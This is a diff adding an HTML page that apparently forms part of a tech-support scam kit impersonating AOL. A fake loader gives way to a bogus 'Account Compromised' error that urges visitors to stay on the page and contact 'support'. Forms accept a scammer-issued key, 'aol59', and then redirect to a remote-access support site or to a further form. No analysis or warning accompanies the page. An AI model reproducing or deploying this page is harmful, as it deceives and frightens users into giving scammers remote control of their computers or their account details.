@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html data-bs-theme="light" lang="en" data-bss-forced-theme="light">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Loading.....</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/Noto%20Sans%20Adlam.css">
+    <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
+    <link rel="stylesheet" href="assets/fonts/font-awesome.min.css">
+    <link rel="stylesheet" href="assets/fonts/fontawesome5-overrides.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/err.css">
+    <link rel="stylesheet" href="assets/css/font-awesome.min.css">
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <style>
+        .loader {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+            background-color: #fff;
+        }
+
+        .loader-text {
+            font-size: 2em;
+            font-weight: bold;
+            color: #000;
+        }
+
+        .dot {
+            animation: dot-blink 1s infinite;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes dot-blink {
+            0% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .loader-text span:nth-child(1) {
+            color: red;
+        }
+
+        .loader-text span:nth-child(2) {
+            color: blue;
+        }
+
+        .loader-text span:nth-child(3) {
+            color: green;
+        }
+    </style>
+</head>
+
+<body>
+    <nav class="navbar navbar-expand bg-body py-3">
+        <div class="container"><a class="navbar-brand d-flex align-items-center" href="#"><img class="img-fluid logo2" src="assets/img/logo.png" alt="" width="100" height="40"></a>
+            <nav></nav>
+            <nav></nav>
+            <nav></nav>
+            <nav></nav>
+            <nav></nav>
+            <ul class="list-unstyled d-flex d-xxl-flex justify-content-end align-items-center justify-content-xxl-end align-items-xxl-center">
+                <li>Help </li>
+                <li>Terms</li>
+                <li>Privacy</li>
+            </ul>
+        </div>
+    </nav>
+    <div class="loader">
+        <div class="loader-text">
+            Please wait<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>
+        </div>
+    </div>
+    <div class="loader1" style="display: none; margin-top: 2em;">
+        <div class="container">
+            <h1 class="text-center in-head">Error <span>"LOGA379A"</span> Unable to sign in your account</h1>
+            <p class="text-center nd-para-2">Account Compromised - Unable to confirm your identity </p>
+            <p class="text-center nd-para-3">Do not refresh or close the page you might lose your AOL Email Account</p>
+            <p class="text-center nd-para-4">You will get a call from our support representative shortly, If you cannot wait we recommend you to contact our chat support now</p>
+            <h3 class="text-center nd-para-5">Contact Customer Support </h3>
+            <div class="col-sm-12 col-md-10 col-lg-8 text-center col-lg-offset-2 col-md-offset-2 caht-b-gr">
+                <div class="text-center col-sm-4 er-box">
+                    <h1><i class="fas fa-comments" aria-hidden="true"></i></h1>
+                    <p>For instant help live chat now to resolve the issues <br></p><a>Chat</a>
+                </div>
+                <div class="text-center col-sm-4 er-box">
+                    <h1><i class="fas fa-envelope" aria-hidden="true"></i></h1>
+                    <p>Email us and we will follow up within 24 hours. </p><a data-toggle="modal" data-target="#myModal">Email</a>
+                </div>
+                <div class="text-center col-sm-4 er-box">
+                    <h1><i class="fa fa-user-circle-o" aria-hidden="true"></i></h1>
+                    <p>Connect with customer service for more help.</p><a data-toggle="modal" data-target="#myModal1">Connect</a>
+                </div>
+                <p class="foo-copy"></p>
+                <hr><br>
+                <div class="fo-list">
+                    <ul>
+                        <li>English &nbsp;| &nbsp;</li>
+                        <li>Legal Notices &nbsp; |&nbsp;</li>
+                        <li>License Agreement &nbsp; |&nbsp; </li>
+                        <li>Privacy Policy &nbsp; |&nbsp;</li>
+                        <li>Support Policy &nbsp; | &nbsp;</li>
+                        <li>Careers &nbsp; | &nbsp;</li>
+                        <li>Cookies &nbsp; |&nbsp;</li>
+                        <li>System Status</li>
+                        <li></li>
+                    </ul>
+                </div>
+                <hr>
+                <div class="copyright-foo">
+                    <ul>
+                        <li><img src="img/sy.html" class="image-responsive co-fo-im" alt=""></li>
+                        <li>Copyright © 2019 Aol Support Inc. All rights reserved.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal fade" role="dialog" tabindex="-1" id="myModal">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-body text-center"><button class="close" data-dismiss="modal" type="button">×</button>
+                    <form action="#" id="form1"><span class="email-span"></span>
+                        <p class="modal-cont">Chat with a support representative to generate key</p><input type="text" class="modal-input email-input" placeholder="Enter your Key"><input type="submit" class="modal-submit" value="Submit">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal fade" role="dialog" tabindex="-1" id="myModal1">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-body text-center"><button class="close" data-dismiss="modal" type="button">×</button>
+                    <form action="#" id="form2"><span class="contact-span"></span>
+                        <p class="modal-cont">Chat with a support representative to generate key</p><input type="text" class="modal-input contact-input" placeholder="Enter your Key"><input type="submit" class="modal-submit" value="Submit">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+    <script src="assets/js/ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="assets/js/maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            setTimeout(function() {
+                $(".loader1").show();
+                $(".loader").hide();
+            }, 6000);
+        });
+
+        function redirect() {
+            window.location = "form.html";
+        }
+
+        function redirect1() {
+            window.location = "https://fastsupport.gotoassist.com/";
+        }
+
+        $("#form1").submit(function(event) {
+            var a = $(".email-input").val();
+            if (a === "aol59") {
+                setTimeout("redirect()", 0)
+            } else {
+                $(".email-span").text("Not valid").show();
+                event.preventDefault();
+            }
+        });
+
+        $("#form2").submit(function(event) {
+            var b = $(".contact-input").val();
+            if (b === "aol59") {
+                setTimeout("redirect1()", 0)
+            } else {
+                $(".contact-span").text("Not Valid").show();
+                event.preventDefault();
+            }
+        });
+    </script>
+</body>
+
+</html>
